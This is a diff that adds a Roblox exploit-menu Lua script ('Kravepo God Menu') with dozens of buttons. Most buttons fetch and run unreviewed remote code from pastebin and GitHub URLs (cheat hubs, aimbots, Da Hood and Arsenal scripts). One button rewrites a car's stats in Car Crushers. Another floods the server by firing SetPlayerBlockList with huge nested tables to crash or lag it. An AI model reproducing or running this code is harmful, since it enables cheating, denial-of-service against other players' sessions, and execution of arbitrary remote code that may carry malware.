@@ -1,0 +1,300 @@
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("Kravepo God Menu", "BloodTheme")
+
+-- MAIN 
+local Main = Window:NewTab("Main")
+local MainSection = Main:NewSection("ALL GAMES SCRIPTS")
+
+                   
+MainSection:NewButton("Purple lock", "LOCK", function()
+loadstring(game:HttpGet("https://pastebin.com/raw/j08xM9mW", true))()
+end)
+
+
+MainSection:NewButton("Lucky Block OP", "LOCK", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/harlenscripts/HarlenHub/main/HarlenScripts"))()
+end)
+
+
+MainSection:NewButton("faded", "LOCK", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/NighterEpic/Faded/main/YesEpic", true))()
+end)
+
+
+MainSection:NewButton("NukerMode Dahood", "LOCK", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Allvideo/test/main/Whitelist.txt", true))()
+end)
+
+
+MainSection:NewButton("Good Dahood", "LOCK", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/hassantheking123321/Everybody/main/My%20hub%22", true))();
+end)
+
+
+MainSection:NewButton("Blox Fruits🍎", "LOCK", function()
+getgenv().Team = "Pirates"
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/3b2169cf53bc6104dabe8e19562e5cc2.lua", true))()
+end)
+
+
+MainSection:NewButton("Car Crushers RAHH", "LOCK", function()
+local config = require(game:GetService("Workspace").CarCollection[game:GetService("Players").LocalPlayer.Name]:FindFirstChild("Car").Body.Configuration)
+config.BrakeForce = 9999999999999
+config.Horsepower = 9999999999999
+config.Acceleration = 9999999999999
+config.TopSpeed = 9999999999999
+config.Handling = 10
+end)
+
+
+MainSection:NewButton("Teleport Menu", "LOCK", function()
+loadstring(game:HttpGet("https://pastebin.com/raw/wb9Vjf4P", true))()
+end)
+
+
+MainSection:NewButton("Astral Hub", "LOCK", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Vcsk/AstralHub/main/Main.lua", true))()
+end)
+
+
+MainSection:NewButton("Ghost Hub!", "LOCK", function()
+loadstring(game:HttpGet("https://pastebin.com/raw/LDfCmKNx", true))()
+end)
+
+
+MainSection:NewButton("FAKE MACRO", "U GO REALLY FAST", function()
+loadstring(game:HttpGetAsync("https://pastebin.com/raw/XiqsUXHj", true))()
+end)
+
+
+MainSection:NewButton("ScriptHub", "SCRIPT", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/SCRIPTHUBV2/main/SCRIPTHUBV2", true))()
+end)
+
+
+MainSection:NewButton("Pluto Dahood", "Very OP", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Scrvpter/Pluto/Lua/Loader.Lua", true))()
+end)
+
+
+MainSection:NewButton("Break in", "SCRIPT", function()
+loadstring(game:HttpGet("https://pastebin.com/raw/kizK33QB", true))()
+end)
+
+
+MainSection:NewButton("pet sim x", "SCRIPT", function()
+loadstring(game:HttpGet("https://gitlab.com/Sky2836/test/-/raw/main/Mobile", true))()
+end)
+
+
+MainSection:NewButton("Big Paintball", "SCRIPT", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AndrewDarkyy/NOWAY/main/darkyyware.lua", true))()
+end)
+
+
+MainSection:NewButton("Dahood", "SCRIPT", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/lerkermer/lua-projects/master/SwagModeV002", true))()
+end)
+
+
+MainSection:NewButton("PLACE HOLDER", "SCRIPT", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/SCRIPTHUBV2/main/SCRIPTHUBV2"))()
+end)
+
+
+MainSection:NewButton("Flag Wars", "SCRIPT", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/kalasthrowaway/stuff/main/flagwars.lua"))()
+end)
+
+
+MainSection:NewButton("evade", "SCRIPT", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GamingScripter/Darkrai-X/main/Games/Evade"))()
+end)
+
+
+MainSection:NewButton("FLY GUI", "SCRIPT", function()
+loadstring(game:HttpGet("https://pastebin.com/raw/g2Ncuqaf"))()
+end)
+
+
+MainSection:NewButton("SOON ;)", "SCRIPT", function()
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/ClairSonata/freescripts/main/brawl2.lua')))()
+end)
+
+
+MainSection:NewButton("break in 2", "SCRIPT", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/danielontopp/scripts/main/77_OCM25E2M.lua.txt", true))()
+end)
+
+
+MainSection:NewButton("PLACE HOLDER", "SCRIPT", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BinaryHubOfficial/binaryhub/main/init.lua"))()
+end)
+
+
+MainSection:NewButton("PLACE HOLDER", "SCRIPT", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/WinterDinder/56-Clubs-Prison-Life-REMASTERED-SCRIPT/main/Main", true))()
+end)
+
+
+MainSection:NewButton("FLAG WARS", "SCRIPT", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/kalasthrowaway/stuff/main/flagwars.lua"))()
+end)
+
+
+MainSection:NewButton("ALL GAMES ", "SCRIPT", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/chillz-workshop/main/ScriptSearcher"))()
+end)
+
+
+MainSection:NewButton("SCP 3008 ", "SCRIPT", function()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/CHnamedata/WhatDaHeck/main/3008GodMode.lua'))()
+end)
+
+
+MainSection:NewButton("PLACE HOLDER ", "SCRIPT", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptpastebin/raw/main/17"))()
+end)
+
+
+MainSection:NewButton("PLACE HOLDER ", "SCRIPT", function()
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/rblxscriptsnet/unfair/main/rblxhub.lua'),true))()
+end)
+
+MainSection:NewButton("PLACEHOLDER ", "SCRIPT", function()
+getgenv().mode = "Autumn" -- Choose from Summer and Autumn (Summer looks bad ngl)
+
+
+
+
+local a = game.Lighting
+a.Ambient = Color3.fromRGB(33, 33, 33)
+a.Brightness = 6.67
+a.ColorShift_Bottom = Color3.fromRGB(0, 0, 0)
+a.ColorShift_Top = Color3.fromRGB(255, 247, 237)
+a.EnvironmentDiffuseScale = 0.105
+a.EnvironmentSpecularScale = 0.522
+a.GlobalShadows = true
+a.OutdoorAmbient = Color3.fromRGB(51, 54, 67)
+a.ShadowSoftness = 0.04
+a.GeographicLatitude = -15.525
+a.ExposureCompensation = 0.75
+local b = Instance.new("BloomEffect", a)
+b.Enabled = true
+b.Intensity = 0.04
+b.Size = 1900
+b.Threshold = 0.915
+local c = Instance.new("ColorCorrectionEffect", a)
+c.Brightness = 0.176
+c.Contrast = 0.39
+c.Enabled = true
+c.Saturation = 0.2
+c.TintColor = Color3.fromRGB(217, 145, 57)
+if getgenv().mode == "Summer" then
+   c.TintColor = Color3.fromRGB(255, 220, 148)
+elseif getgenv().mode == "Autumn" then
+   c.TintColor = Color3.fromRGB(217, 145, 57)
+else
+   warn("No mode selected!")
+   print("Please select a mode")
+   b:Destroy()
+   c:Destroy()
+end
+local d = Instance.new("DepthOfFieldEffect", a)
+d.Enabled = true
+d.FarIntensity = 0.077
+d.FocusDistance = 21.54
+d.InFocusRadius = 20.77
+d.NearIntensity = 0.277
+local e = Instance.new("ColorCorrectionEffect", a)
+e.Brightness = 0
+e.Contrast = -0.07
+e.Saturation = 0
+e.Enabled = true
+e.TintColor = Color3.fromRGB(255, 247, 239)
+local e2 = Instance.new("ColorCorrectionEffect", a)
+e2.Brightness = 0.2
+e2.Contrast = 0.45
+e2.Saturation = -0.1
+e2.Enabled = true
+e2.TintColor = Color3.fromRGB(255, 255, 255)
+local s = Instance.new("SunRaysEffect", a)
+s.Enabled = true
+s.Intensity = 0.01
+s.Spread = 0.146
+
+print("RTX Graphics loaded \n created by Rawget#0001")
+end)
+
+
+MainSection:NewButton("PLACE HOLDER ", "SCRIPT", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/imwifi/1FO/main/main.lua"))()
+end)
+
+
+MainSection:NewButton("PLACE HOLDER ", "SCRIPT", function()
+local char = game:GetService('Players').LocalPlayer.Character or nil
+if char then
+char.HumanoidRootPart.CFrame = CFrame.new(0,9e9,0)
+task.wait(0.5)
+char.HumanoidRootPart.Anchored = true
+end
+while wait(1.5) do --// don't change it's the best
+game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
+local function getmaxvalue(val)
+   local mainvalueifonetable = 499999
+   if type(val) ~= "number" then
+       return nil
+-- this crashed
+   end
+   local calculateperfectval = (mainvalueifonetable/(val+2))
+   return calculateperfectval
+end
+ 
+local function bomb(tableincrease, tries)
+local maintable = {}
+local spammedtable = {}
+ 
+table.insert(spammedtable, {})
+z = spammedtable[1]
+ 
+for i = 1, tableincrease do
+    local tableins = {}
+    table.insert(z, tableins)
+    z = tableins
+end
+ 
+local calculatemax = getmaxvalue(tableincrease)
+local maximum
+ 
+if calculatemax then
+     maximum = calculatemax
+     else
+     maximum = 999999
+end
+ 
+for i = 1, maximum do
+     table.insert(maintable, spammedtable)
+end
+ 
+for i = 1, tries do
+     game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
+end
+end
+ 
+bomb(250, 5) --// change values if client crashes
+end
+end)
+
+
+local MainSection = Main:NewSection("Arsenal NOBAN")
+
+
+MainSection:NewButton("Arsenal Aimbot", "SCRIPT", function()
+loadstring(game:HttpGet("https://rawscripts.net/raw/Arsenal-Aimbot-script-9223", true))()
+end)
+
+
+MainSection:NewButton("Tboa Hub (OP)!", "LOCK", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/tbao143/thaibao/main/TbaoHubArsenal", true))()
+end)
